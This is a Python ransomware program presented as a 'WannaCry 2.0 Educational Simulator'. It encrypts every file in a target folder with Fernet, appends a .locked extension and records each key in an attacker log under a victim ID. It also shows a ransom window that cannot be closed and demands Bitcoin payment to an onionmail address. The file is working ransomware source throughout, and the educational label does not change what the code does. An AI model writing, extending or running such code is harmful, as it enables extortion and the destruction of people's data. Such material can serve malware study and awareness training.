import os
import signal
import hashlib
from tkinter import *
from tkinter import messagebox
from cryptography.fernet import Fernet

# === CONFIG ===
FOLDER_PATH = "./files"
KEY_FILE = "key.key"
ATTACKER_LOG = "attacker_keys.txt"

# === KEY OPS ===
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    victim_id = hashlib.sha256(key).hexdigest()
    with open(ATTACKER_LOG, 'a') as f:
        f.write(f"{victim_id} => {key.decode()}\n")
    print(f"[ATTACKER] Victim ID: {victim_id}")

def load_key():
    with open(KEY_FILE, 'rb') as f:
        return f.read()

def get_victim_id():
    key = load_key()
    return hashlib.sha256(key).hexdigest()

# === ENCRYPTION ===
def encrypt_files():
    key = load_key()
    f = Fernet(key)
    for filename in os.listdir(FOLDER_PATH):
        path = os.path.join(FOLDER_PATH, filename)

        if os.path.isfile(path):
            try:
                with open(path, 'rb') as file:
                    data = file.read()

                # Skip if already Fernet-encrypted
                if data.startswith(b'gAAAAA'):
                    print(f"[~] Already encrypted: {filename}")
                    continue

                encrypted_data = f.encrypt(data)
                with open(path, 'wb') as file:
                    file.write(encrypted_data)

                # Rename to add .locked extension if not already
                if not filename.endswith(".locked"):
                    os.rename(path, os.path.join(FOLDER_PATH, filename + ".locked"))

                print(f"[+] Encrypted: {filename}")
            except Exception as e:
                print(f"[!] Encryption failed: {filename} => {e}")

# === DECRYPTION ===
def decrypt_files(user_key):
    try:
        f = Fernet(user_key)
    except Exception as e:
        print(f"[!] Invalid key format: {e}")
        return False

    all_decrypted = True

    for filename in os.listdir(FOLDER_PATH):
        path = os.path.join(FOLDER_PATH, filename)

        if os.path.isfile(path):
            try:
                with open(path, 'rb') as file:
                    data = file.read()

                decrypted_data = f.decrypt(data)

                with open(path, 'wb') as file:
                    file.write(decrypted_data)

                # Remove .locked extension
                if filename.endswith(".locked"):
                    new_name = filename.replace(".locked", "")
                    os.rename(path, os.path.join(FOLDER_PATH, new_name))

                print(f"[+] Decrypted: {filename}")
            except Exception as e:
                print(f"[!] Decryption failed: {filename} => {e}")
                all_decrypted = False

    return all_decrypted

# === GUI ===
def start_gui():
    def attempt_decrypt():
        user_key = entry.get().encode()
        try:
            Fernet(user_key)
        except:
            messagebox.showerror("Invalid", "Malformed key.")
            return

        if decrypt_files(user_key):
            messagebox.showinfo("Success", "Files decrypted successfully.")
            root.destroy()
        else:
            messagebox.showerror("Error", "Wrong key or partial failure.")

    # Block Ctrl+C
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    root = Tk()
    root.title("WannaCry 2.0 - Educational Simulator")
    root.geometry("640x480+200+100")
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable X button
    root.attributes("-topmost", True)  # Always on top

    frame = Frame(root, bg="#1a1a1a")
    frame.pack(expand=True, fill="both")

    Label(frame, text="Ooops! Your files are encrypted!", font=("Courier", 18, "bold"),
          fg="red", bg="#1a1a1a").pack(pady=20)

    victim_id = get_victim_id()
    Label(frame, text=f"Victim ID: {victim_id}", font=("Courier", 10),
          fg="orange", bg="#1a1a1a").pack()

    ransom_note = """
Your documents, pictures, and other files have been encrypted.

To restore your data:
1. Send the Victim ID above to:
   decrypt@onionmail.org
2. Pay 500 USD in BTC to:
   bc1qxy2kgdygjrsqtz...
3. Enter the decryption key here.

This window cannot be closed or minimized.
"""
    Label(frame, text=ransom_note, font=("Courier", 10), fg="white",
          bg="#1a1a1a", justify=LEFT).pack(pady=20)

    global entry
    entry = Entry(frame, font=("Courier", 12), width=50, justify='center')
    entry.pack(pady=10)
    entry.focus_force()

    Button(frame, text="🔓 Decrypt Files", font=("Courier", 12), bg="green",
           fg="white", command=attempt_decrypt).pack(pady=20)

    root.mainloop()

# === MAIN ===
if __name__ == '__main__':
    if not os.path.exists(KEY_FILE):
        generate_key()
    encrypt_files()
    start_gui()

